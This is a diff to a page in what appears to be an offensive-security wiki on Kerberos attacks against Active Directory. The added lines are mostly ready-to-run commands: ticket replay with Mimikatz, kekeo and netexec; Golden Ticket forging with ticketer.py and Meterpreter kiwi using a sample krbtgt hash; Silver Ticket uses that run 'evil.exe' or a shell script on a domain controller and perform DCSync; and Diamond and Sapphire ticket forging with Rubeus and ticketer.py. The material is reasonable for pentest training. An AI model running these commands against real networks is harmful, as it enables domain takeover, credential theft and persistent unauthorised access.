@@ -15,8 +15,8 @@ tags:
   - dcsync
 phase: post-exploitation
 date_created: 2026-05-13
-date_updated: 2026-07-14
-sources: [0xdf-kerberos, hacktricks-network]
+date_updated: 2026-09-10
+sources: [0xdf-kerberos, hacktricks-network, InternalAllTheThings]
 ---
 
 # Kerberos Attacks
@@ -206,6 +206,15 @@ secretsdump.py -k -no-pass DOMAIN/user@dc.domain.local
 
 # Convert between formats
 ticketConverter.py ticket.kirbi ticket.ccache
+
+# kekeo - convert kirbi to ccache
+kekeo# misc::convert ccache ticket.kirbi
+
+# Replay a ccache ticket on Windows (Mimikatz)
+mimikatz.exe "kerberos::ptc C:\temp\TGT_Administrator@lab.local.ccache"
+
+# netexec with an existing ccache
+KRB5CCNAME=/tmp/administrator.ccache netexec smb 10.10.10 -u user --use-kcache
 ```
 
 See [[pass-the-hash]] for Shadow Credentials (pywhisker), Overpass-the-Hash, and keytab-based authentication.
@@ -215,6 +224,8 @@ See [[pass-the-hash]] for Shadow Credentials (pywhisker), Overpass-the-Hash, and
 ## Golden Ticket
 
 A **Golden Ticket** is a forged TGT signed with the krbtgt account's NTLM hash. Because all TGTs in the domain are verified against the krbtgt hash, a forged TGT is unconditionally trusted by every service. The ticket can be crafted for any user and any group membership (including Domain Admins). This is primarily a persistence technique since it requires the krbtgt hash upfront.
+
+As a result of `CVE-2021-42287` mitigations, the ticket cannot use a non-existent account name.
 
 ### Obtain krbtgt hash
 
@@ -243,11 +254,31 @@ mimikatz # kerberos::golden /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /rc4:<krbtgt_
 # Impacket — ticketer.py (Linux)
 ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL Administrator
 
+# ticketer.py with explicit user-id and extra group SID (e.g. Domain Admins 512)
+python3 ticketer.py -nthash <KRBTGT_NTLM_HASH> \
+  -domain-sid S-1-5-21-1234567890-2345678901-3456789012 \
+  -domain corp.local \
+  -user-id 500 \
+  -extra-sid S-1-5-21-1234567890-2345678901-3456789012-512 \
+  Administrator
+
 export KRB5CCNAME=Administrator.ccache
 psexec.py -k -no-pass DOMAIN.LOCAL/Administrator@dc.domain.local
 ```
 
 Note: After a password reset of krbtgt, existing Golden Tickets are invalidated. Two resets (24+ hours apart) are required to fully rotate the secret.
+
+```bash
+# Meterpreter (kiwi) - dcsync the hash, then forge and use the ticket
+dcsync_ntlm krbtgt
+load kiwi
+golden_ticket_create -d <domainname> -k <nthash of krbtgt> -s <SID without the RID> -u <user_for_the_ticket> -t <location_to_store_tck>
+golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
+kerberos_ticket_purge
+kerberos_ticket_use /root/Downloads/pentestlabuser.tck
+```
+
+Golden tickets with an Enterprise Admins SID can be used across forest boundaries.
 
 ---
 
@@ -266,9 +297,50 @@ export KRB5CCNAME=Administrator.ccache
 mssqlclient.py -k -no-pass DOMAIN.LOCAL/Administrator@db.domain.local
 ```
 
+Interesting services to target with a Silver Ticket:
+
+| Service Type | Service Silver Tickets | Attack |
+|--------------|------------------------|--------|
+| WMI | HOST + RPCSS | `wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"` |
+| PowerShell Remoting | CIFS + HTTP + (wsman?) | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
+| WinRM | HTTP + wsman | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
+| Scheduled Tasks | HOST | `schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"` |
+| Windows File Share (CIFS) | CIFS | `dir \\dc01\c$` |
+| LDAP operations including Mimikatz DCSync | LDAP | `lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt` |
+| Windows Remote Server Administration Tools | RPCSS + LDAP + CIFS | / |
+
 **HTB: Intelligence** — the GMSA service account had constrained delegation; the machine account hash was used to forge a service ticket for the DC, then DCSync was triggered.
 
 **HTB: Scrambled** — NTLM was disabled domain-wide. After Kerberoasting the `SqlSvc` account, a Silver Ticket was forged for `MSSQLSvc` to authenticate to the MSSQL service without NTLM.
+
+---
+
+## Diamond Ticket
+
+> Request a legit low-priv TGT and recalculate only the PAC field, providing the krbtgt encryption key.
+
+A Diamond Ticket starts from a genuinely issued TGT (so a matching AS-REQ exists on the DC), decrypts it with the krbtgt key, edits the PAC, and re-encrypts it. Stealthier than a fully forged Golden Ticket because ticket times and request patterns stay legitimate.
+
+Requirements: the krbtgt NT hash and the krbtgt AES key.
+
+```bash
+ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'
+
+Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
+```
+
+---
+
+## Sapphire Ticket
+
+> Requesting the target user's PAC with `S4U2self+U2U` exchange during TGS-REQ(P) (PKINIT).
+
+The goal is to mimic the PAC field as close as possible to a legitimate one: the PAC is copied from a real high-privilege target user rather than crafted. Requires the krbtgt AES key and [Impacket PR#1411](https://github.com/SecureAuthCorp/impacket/pull/1411).
+
+```bash
+# baduser argument will be ignored
+ticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'
+```
 
 ---
 
@@ -531,20 +603,33 @@ Derived from 0xdf HackTheBox writeups covering Kerberos-heavy machines:
 
 Cross-references: [[ad-enumeration]], [[ad-lateral-movement]], [[pass-the-hash]], [[ad-persistence]], [[password-cracking]], [[netexec]], [[wiki/tools/certipy]], [[adcs]]
 
+## References
+
+- [Golden ticket - Pentestlab](https://pentestlab.blog/2018/04/09/golden-ticket/)
+- [How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf](https://adsecurity.org/?p=2011)
+- [How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)
+- [Diamond tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond)
+- [A Diamond (Ticket) in the Ruff - Charlie Clark](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
+- [Sapphire tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)
+- [WONKACHALL AKERVA NDH2018 - Write Up Part 1](https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/)
+- [WONKACHALL AKERVA NDH2018 - Write Up Part 2](https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-2/)
+- [WONKACHALL AKERVA NDH2018 - Write Up Part 3](https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-3/)
+- [WONKACHALL AKERVA NDH2018 - Write Up Part 4](https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-4/)
+- [WONKACHALL AKERVA NDH2018 - Write Up Part 5](https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-5/)
+- [How To Attack Kerberos 101 - m0chan](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
+- [Kerberos (II): How to attack Kerberos? - Eloy Perez](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
+
 ## Wired sub-techniques
 
 <!-- auto-wired: context-reachable sub-technique pages -->
 - [[active-directory-tricks]]
 - [[forest-to-forest-compromise-trust-ticket]]
-- [[hash-overpass-the-hash]]
-- [[hash-pass-the-key]]
 - [[internal-kerberos-relay]]
 - [[kerberos-bronze-bit]]
 - [[kerberos-delegation-constrained-delegation]]
 - [[kerberos-delegation-resource-based-constrained-delegation]]
 - [[kerberos-delegation-unconstrained-delegation]]
 - [[kerberos-service-for-user-extension]]
-- [[kerberos-tickets]]
 - [[ms14-068-checksum-validation]]
 - [[roasting-timeroasting]]
 
